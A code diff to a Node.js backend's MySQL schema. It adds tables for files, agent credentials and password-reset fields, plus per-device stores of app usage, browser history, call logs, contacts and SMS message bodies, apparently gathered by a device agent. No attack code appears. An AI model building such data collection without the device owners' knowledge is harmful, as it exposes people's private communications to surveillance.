@@ -26,10 +26,14 @@ CREATE TABLE IF NOT EXISTS users (
     auth_token_hash TEXT,
     pairing_token VARCHAR(255) UNIQUE,
     pairing_user_id VARCHAR(255) UNIQUE,
+    password_reset_otp_hash TEXT,
+    password_reset_otp_expires_at DATETIME NULL,
+    admin_pin_hash TEXT,
     last_login_at DATETIME NULL,
     created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
     updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
     INDEX idx_user_email (email),
+    INDEX idx_user_google (google_id),
     INDEX idx_user_pairing (pairing_token, pairing_user_id)
 );
 
@@ -98,6 +102,136 @@ CREATE TABLE IF NOT EXISTS notifications (
     created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
     INDEX idx_notif_user (user_id),
     INDEX idx_notif_unread (user_id, is_read)
+);
+
+CREATE TABLE IF NOT EXISTS virtual_files (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(255) NOT NULL,
+    name VARCHAR(512) NOT NULL,
+    original_path TEXT,
+    virtual_folder VARCHAR(1024) DEFAULT '/',
+    cloudinary_url TEXT NOT NULL,
+    cloudinary_public_id TEXT NOT NULL,
+    resource_type VARCHAR(32) DEFAULT 'raw',
+    file_type VARCHAR(32) DEFAULT 'raw',
+    page_type VARCHAR(32) DEFAULT 'file',
+    mime_type VARCHAR(255) DEFAULT 'application/octet-stream',
+    size BIGINT DEFAULT 0,
+    tags JSON,
+    share_enabled TINYINT(1) DEFAULT 0,
+    share_token VARCHAR(128),
+    is_deleted TINYINT(1) DEFAULT 0,
+    deleted_at DATETIME NULL,
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    INDEX idx_vf_device_folder (device_id, virtual_folder(255)),
+    INDEX idx_vf_device_deleted (device_id, is_deleted)
+);
+
+CREATE TABLE IF NOT EXISTS virtual_folders (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(255) NOT NULL,
+    name VARCHAR(512) NOT NULL,
+    path VARCHAR(1024) NOT NULL,
+    parent_path VARCHAR(1024) DEFAULT '/',
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    UNIQUE KEY uniq_device_path (device_id, path(255)),
+    INDEX idx_vfo_device_parent (device_id, parent_path(255))
+);
+
+CREATE TABLE IF NOT EXISTS agent_credentials (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    user_id VARCHAR(64) NOT NULL,
+    device_id VARCHAR(255) UNIQUE NOT NULL,
+    label VARCHAR(255) DEFAULT 'My Agent',
+    token_hash TEXT NOT NULL,
+    last_connected_at DATETIME NULL,
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    INDEX idx_agent_user (user_id),
+    INDEX idx_agent_device (device_id)
+);
+
+CREATE TABLE IF NOT EXISTS app_histories (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(255) NOT NULL,
+    user_id VARCHAR(64) DEFAULT '',
+    app_name VARCHAR(255) NOT NULL,
+    executable_path TEXT,
+    last_opened DATETIME NOT NULL,
+    app_type VARCHAR(32) DEFAULT 'app',
+    duration BIGINT DEFAULT 0,
+    category VARCHAR(128) DEFAULT '',
+    windows_user VARCHAR(255) DEFAULT '',
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    INDEX idx_app_device (device_id),
+    INDEX idx_app_user (user_id),
+    INDEX idx_app_last_opened (last_opened)
+);
+
+CREATE TABLE IF NOT EXISTS browser_histories (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(255) NOT NULL,
+    user_id VARCHAR(64) DEFAULT '',
+    browser VARCHAR(64) NOT NULL,
+    url TEXT NOT NULL,
+    title TEXT,
+    visit_time DATETIME NOT NULL,
+    visit_count INT DEFAULT 1,
+    domain VARCHAR(255) DEFAULT '',
+    windows_user VARCHAR(255) DEFAULT '',
+    browser_profile VARCHAR(255) DEFAULT '',
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    INDEX idx_browser_device (device_id),
+    INDEX idx_browser_user (user_id),
+    INDEX idx_browser_time (visit_time)
+);
+
+CREATE TABLE IF NOT EXISTS call_logs (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(255) NOT NULL,
+    user_id VARCHAR(64) DEFAULT '',
+    number VARCHAR(64) DEFAULT '',
+    name VARCHAR(255) DEFAULT '',
+    type INT DEFAULT 0,
+    duration INT DEFAULT 0,
+    timestamp DATETIME NOT NULL,
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    INDEX idx_call_device (device_id),
+    INDEX idx_call_user (user_id),
+    INDEX idx_call_time (timestamp)
+);
+
+CREATE TABLE IF NOT EXISTS contacts (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(255) NOT NULL,
+    user_id VARCHAR(64) DEFAULT '',
+    name VARCHAR(255) DEFAULT '',
+    phone VARCHAR(64) DEFAULT '',
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    INDEX idx_contact_device (device_id),
+    INDEX idx_contact_user (user_id)
+);
+
+CREATE TABLE IF NOT EXISTS sms_messages (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(255) NOT NULL,
+    user_id VARCHAR(64) DEFAULT '',
+    address VARCHAR(128) DEFAULT '',
+    body TEXT,
+    type INT DEFAULT 0,
+    timestamp DATETIME NOT NULL,
+    is_read TINYINT(1) DEFAULT 0,
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    INDEX idx_sms_device (device_id),
+    INDEX idx_sms_user (user_id),
+    INDEX idx_sms_time (timestamp)
 );
 `;
 
@@ -354,6 +488,28 @@ async function initializeMysqlTables(targetPool) {
         for (const statement of statements) {
             await p.query(statement);
         }
+
+        // Idempotent column and index migrations for tables created in earlier versions
+        const migrations = [
+            `ALTER TABLE users ADD COLUMN google_id VARCHAR(255) DEFAULT ''`,
+            `ALTER TABLE users ADD COLUMN provider VARCHAR(32) NOT NULL DEFAULT 'local'`,
+            `ALTER TABLE users ADD COLUMN avatar_url TEXT`,
+            `ALTER TABLE users ADD COLUMN email_verified TINYINT(1) DEFAULT 0`,
+            `ALTER TABLE users ADD COLUMN pairing_token VARCHAR(255) UNIQUE`,
+            `ALTER TABLE users ADD COLUMN pairing_user_id VARCHAR(255) UNIQUE`,
+            `ALTER TABLE users ADD COLUMN password_reset_otp_hash TEXT`,
+            `ALTER TABLE users ADD COLUMN password_reset_otp_expires_at DATETIME NULL`,
+            `ALTER TABLE users ADD COLUMN admin_pin_hash TEXT`,
+            `ALTER TABLE users ADD INDEX idx_user_google (google_id)`,
+            `ALTER TABLE users ADD INDEX idx_user_pairing (pairing_token, pairing_user_id)`
+        ];
+        for (const migration of migrations) {
+            try {
+                await p.query(migration);
+            } catch (_) {
+                // Column or index already exists, silently ignore
+            }
+        }
     } catch (err) {
         console.error('MySQL schema initialization warning:', err.message);
     }
@@ -437,6 +593,13 @@ async function testMysqlConnection(targetConfig) {
         const version = rows[0]?.version || 'Unknown';
         const dbName = rows[0]?.current_db || config.options?.database || 'default';
         const hostDisplay = targetHost || 'server';
+
+        // Auto-initialize all tables on test success so phpMyAdmin immediately displays all 13 tables
+        try {
+            await initializeMysqlTables(conn);
+        } catch (tableErr) {
+            console.warn('Auto table initialization notice:', tableErr.message);
+        }
 
         try {
             await conn.end();
